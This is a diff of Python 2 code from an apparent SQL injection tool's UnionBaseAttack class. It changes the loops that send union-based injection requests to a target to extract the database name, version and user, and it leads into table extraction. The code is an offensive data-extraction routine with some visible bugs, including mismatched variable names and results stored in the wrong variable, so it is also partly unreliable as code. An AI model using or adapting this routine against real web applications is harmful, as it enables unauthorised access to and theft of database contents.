@@ -140,22 +140,7 @@ class UnionBaseAttack(object):
         version_name = ""
 
         #----------------------------------------------Database extracting--------------------------------------------
-        #1. extarct the database name
         for item in define_database_detection_query_php:
-            response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
-            if response.content.find("FINDDATABASE=>") is not -1:
-                end = lib.re.search("FINDDATABASE=>", response.content).end()
-                starts = lib.re.search("<=FINDDATABASE", response.content).start()
-                if response.content[end:starts].find("") is not -1:
-                    break
-                else:
-                    print TextColor.CBEIGE2 + str("[+]Database is => ") + response.content[end:starts] + TextColor.WHITE
-                    database_name = response.content[end:starts]
-            lib.sleep(.5)
-        
-        lib.sleep(.5)
-
-        for item in define_database_detection_query_php_bypass:
             response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
             if response.content.find("'2134115356'") is not -1:
                 end = lib.re.search("'2134115356'", response.content).end()
@@ -163,22 +148,11 @@ class UnionBaseAttack(object):
                 print TextColor.CBEIGE2 + str("[+]Database is => ") + response.content[end:starts] + TextColor.WHITE
                 database_name = response.content[end:starts]
             lib.sleep(.5)
+        lib.sleep(.5)
+        
         #------------------------------------------------------End of Database extracting-----------------------------------------------------
         #-----------------------------------------------Version extracting---------------------------------------------------
-        #2. extract the version of database
         for item in define_version_detection_query_php:
-            response = response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
-            if response.content.find("FINDVERSION=>") is not -1:
-                end = lib.re.search("FINDVERSION=>", response.content).end()
-                start = lib.re.search("<=FINDVERSION", response.content).start()
-                if response.content[end:starts].find("") is not -1:
-                    break
-                else:
-                    print TextColor.CBEIGE2 + str("[+]Version of database is => ") + response.content[end:start] + TextColor.WHITE
-                    version_name = response.content[end:start]
-            lib.sleep(.5)
-
-        for item in define_version_detection_query_php_bypass:
             response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
             if response.content.find("'2134115356'") is not -1:
                 end = lib.re.search("'2134115356'", response.content).end()
@@ -186,25 +160,10 @@ class UnionBaseAttack(object):
                 print TextColor.CBEIGE2 + str("[+]Version of database is => ") + response.content[end:starts] + TextColor.WHITE
                 database_name = response.content[end:starts]
             lib.sleep(.5)
-
+        lib.sleep(.5)
         #----------------------------------------------End of version extracting-------------------------------------------------
         #---------------------------------------------------------Extract User of database-------------------------------------------------
-        #3. extract the user of database
         for item in define_user_detection_query_php:
-            response = response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
-            if response.content.find("FINDUSER=>") is not -1:
-                end = lib.re.search("FINDUSER=>", response.content).end()
-                start = lib.re.search("<=FINDUSER", response.content).start()
-                if response.content[end:starts].find("") is not -1:
-                    break
-                else:
-                    print TextColor.CBEIGE2 + str("[+]User of database is => ") + response.content[end:start] + TextColor.WHITE
-                    version_name = response.content[end:start]
-            lib.sleep(.5)
-
-        lib.sleep(.5)        
-        
-        for item in define_user_detection_query_php_bypass:
             response = lib.requests.get(str(lib.string.replace(success_InjectedString, vuln_columns[0], item)), headers=define_headerdata)
             if response.content.find("'2134115356'") is not -1:
                 end = lib.re.search("'2134115356'", response.content).end()
@@ -212,6 +171,8 @@ class UnionBaseAttack(object):
                 print TextColor.CBEIGE2 + str("[+]User of database is => ") + response.content[end:starts] + TextColor.WHITE
                 database_name = response.content[end:starts]
             lib.sleep(.5)
+        lib.sleep(.5)
+        
         #---------------------------------------------------------End of Extract User of database-------------------------------------------------
         #------------------------------------------StarTing Extracting tables of DataBaseS--------------------------------------------
         #4.1 extract the tables of database
